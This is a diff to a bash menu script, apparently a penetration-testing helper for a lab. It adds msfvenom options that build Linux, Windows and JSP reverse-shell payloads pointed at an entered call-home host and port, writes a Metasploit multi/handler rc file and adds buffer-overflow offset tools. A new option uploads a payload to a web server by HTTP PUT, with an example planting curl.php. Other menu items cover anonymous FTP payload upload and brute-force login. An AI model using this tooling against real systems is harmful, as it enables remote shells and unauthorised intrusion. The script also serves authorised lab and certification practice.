@@ -1,4 +1,5 @@
 #!/bin/bash
+#Author:James Garrard
 #Prereqs 
 clear
 updatedb
@@ -6,7 +7,7 @@ echo "-------------NETWORK INFO----------------------"
 ifconfig | grep inet
 #searchsploit --update 
 echo""
-echo "[*] Starting APache service...."
+echo "[*] Starting Apache services...."
 service apache2 start
 
 func_Setup_WEBDAV_SMB_Server_Over_HTTP(){
@@ -72,8 +73,6 @@ done
 }
 
 func_NMAP_MENU(){
-echo "Enter IP or CIDR or Range: "
-read RangeCIDR
 while true
 do
 echo "NMAP Menu"
@@ -162,8 +161,8 @@ func_NMAP_MENU
 8)
 echo "Enter IP to scan: "
 read IP
-echo "[!] Running: nmap -p 445" $IP "--script smb-enum-shares,smb-ls"
-gnome-terminal --tab --title="NMAP Shares Enum Scan" -- nmap -p 445 $IP --script smb-enum-shares,smb-ls
+echo "[!] Running: 'nmap -p 445" $IP "--script smb-enum-shares,smb-ls' in another tab..."
+nmap -p 445 $IP --script smb-enum-shares,smb-ls
 func_NMAP_MENU
 ;;
 99) func_MAIN
@@ -220,9 +219,12 @@ echo "00) Select/Change Payload"
 echo "0) Setup Apache2 for file download"
 echo "1) Generate Windows Reverse SHELLCODE"
 echo "2) Generate Reverse tcp Shell exe"
-echo "3) Start CUSTOM PAYLOAD and Handler"
-echo "4) Generate Unique String of size N"
-echo "5) Run PatternOffset for Unique string"
+echo "3) Generate CUSTOM PAYLOAD"
+echo "4) Generate CUSTOM PAYLOAD and Handler"
+echo "5) Generate Unique String of size N"
+echo "6) Run PatternOffset for Unique string"
+echo "7) Search for MSF Payload"
+echo "8) Search for MSF Payload Format"
 echo ""
 echo "99) to goto MAIN"
 echo ""
@@ -272,10 +274,16 @@ read lport
 commandlinearg+=" LPORT="$lport
 
 echo "[+] "$commandlinearg
-echo "Search Term to look for in Payload title (nc=windows/shell_reverse_tcp): "
+echo ""
+echo "Payloads Ref's:"
+echo "Linux=linux/x86/shell_reverse_tcp"
+echo "Windows=windows/shell_reverse_tcp"
+echo "Tomcat/jsp=java/jsp_shell_reverse_tcp"
+echo ""
+echo "Search Term to look for in Payload title: "
 read searchterm
 echo "[*] Search results below...please wait for prompt"
-msfvenom -l payloads |grep $searchterm
+msfvenom -l payloads | grep $searchterm
 
 echo "[+] "$commandlinearg
 echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
@@ -285,6 +293,9 @@ commandlinearg+=" -p "$payload
 echo "[+] "$commandlinearg
 echo "[*] Generating List of Payload Formats...please wait for prompt"
 msfvenom -l formats
+echo "Payloads Ref's:"
+echo "Linux=-f elf"
+echo ""
 echo "Enter Payload format: "
 read format
 commandlinearg+=" -f "$format
@@ -296,12 +307,60 @@ echo "Enter Payload Architiecture: "
 read platform
 commandlinearg+=" --platform "$platform
 echo ""
-commandlinearg+=" -o /root/MSFV_"$platform$lport."$format
-echo "[+] Running this command: "$commandlinearg
+commandlinearg+=" -o /root/MSFV_"$platform$lport"."$format
+echo "[+] Running this command:" $commandlinearg
+;;
+4)
+commandlinearg="msfvenom"
+echo "Enter LHOST call home IP: "
+read lhost
+commandlinearg+=" LHOST="$lhost
+
+echo "[+] "$commandlinearg
+echo "Enter Lport call home port: "
+read lport
+commandlinearg+=" LPORT="$lport
+
+echo "[+] "$commandlinearg
+echo ""
+echo "Payloads Ref's:"
+echo "Linux=linux/x86/shell_reverse_tcp"
+echo "Windows=windows/shell_reverse_tcp"
+echo "Tomcat/jsp=java/jsp_shell_reverse_tcp"
+echo ""
+echo "Search Term to look for in Payload title: "
+read searchterm
+echo "[*] Search results below...please wait for prompt"
+msfvenom -l payloads | grep $searchterm
+
+echo "[+] "$commandlinearg
+echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
+read payload
+commandlinearg+=" -p "$payload
+
+echo "[+] "$commandlinearg
+echo "[*] Generating List of Payload Formats...please wait for prompt"
+msfvenom -l formats
+echo "Payloads Ref's:"
+echo "Linux=-f elf"
+echo ""
+echo "Enter Payload format: "
+read format
+commandlinearg+=" -f "$format
+
+echo "[+] "$commandlinearg
+echo "[*] Generating List of Payload Platforms to compile for...please wait for prompt"
+msfvenom -l platforms
+echo "Enter Payload Architiecture: "
+read platform
+commandlinearg+=" --platform "$platform
+echo ""
+commandlinearg+=" -o /root/MSFV_"$platform$lport"."$format
+echo "[+] Running this command:" $commandlinearg
 echo ""
 echo "[*] Generating msf rc file to run from msfconsole at /tmp/handler.rc"
 echo ""
-echo "[!] Payload at: /root/MSFV_"$platform"."$format"
+echo "[!] Payload at: /root/MSFV_"$platform"."$format
 echo ""
 echo "[*] Script looks like: 
 use exploit/multi/handler
@@ -326,16 +385,29 @@ echo ""
 echo ""
 func_MSFVEnom_Menu
 ;;
-4)
+5)
 echo "Enter Size of unique string to generate: "
 read size
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $size
 func_MSFVEnom_Menu
 ;;
-5)
+6)
 echo "Enter EIP Reg char digits: "
 read EIP
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP
+func_MSFVEnom_Menu
+;;
+7)
+clear
+echo "Search Term to look for in Payload title: "
+read searchterm
+echo "[*] Search results below...please wait for prompt"
+msfvenom -l payloads | grep $searchterm
+func_MSFVEnom_Menu
+;;
+8)
+clear
+msfvenom -l formats
 func_MSFVEnom_Menu
 ;;
 99)
@@ -409,20 +481,25 @@ echo "8) Nc to clear text IP and port"
 echo "9) SNMP Walk"
 echo ""
 echo "-- Payloads/Exploit --"
-echo""
+echo ""
 echo "10) GOTO MSFVENOM and Exploit Dev Menu"
 echo "11) Start netcat Listener"
 echo "12) Start Metasploit MultiHandler"
 echo "13) GOTO EXPLOITS Menu"
 echo "14) GOTO Search For Exploits Menu"
+echo ""
+echo "-- Misc --"
+echo ""
 echo "15) Setup Native WEBDAV Sevrer on Apache"
 echo "16) Attempt FTP anon Login and Payload Upload"
 echo "17) Generate Wordlist from Webpage"
 echo "18) Launch Online Brute Force Login"
-echo "19) Setup Port Forward w/rinetd (like lan turtle)"
+echo "19) Setup Port Forward with 'rinetd'"
 echo "20) Launch Web Server Dir BruteForcer"
+echo "21) HTTP PUT File to a Web Server"
 echo ""
 echo "--Tasks Sub-Menu--"
+echo ""
 echo "00) RDP to test windows machine (10.11.20.153)"
 echo "66) Tail Apache Access log"
 echo "77) Launch Sparta"
@@ -458,7 +535,9 @@ func_MAIN
 2) func_HTML_Domain_Scrape
 func_MAIN
 ;;
-4) func_NMAP_MENU
+4)
+clear 
+func_NMAP_MENU
 func_MAIN
 ;;
 5) 
@@ -609,6 +688,18 @@ func_MAIN
 ;;
 20)
 gnome-terminal --tab --title="Web Dir Brute Forcer" -- dirbuster
+func_MAIN
+;;
+21)
+clear
+echo "Enter Local path to payload: "
+read Path
+echo "Enter Dest IP or Domain with http(s)://: "
+read Dest
+curl $Dest --upload-file $Path -v
+echo ""
+echo "[*] Command run is: curl $Dest --upload-file $Path"
+echo "[!] Example : curl http://192.168.1.103/dav/ --upload-file /root/Desktop/curl.php -v"
 func_MAIN
 ;;
 66)
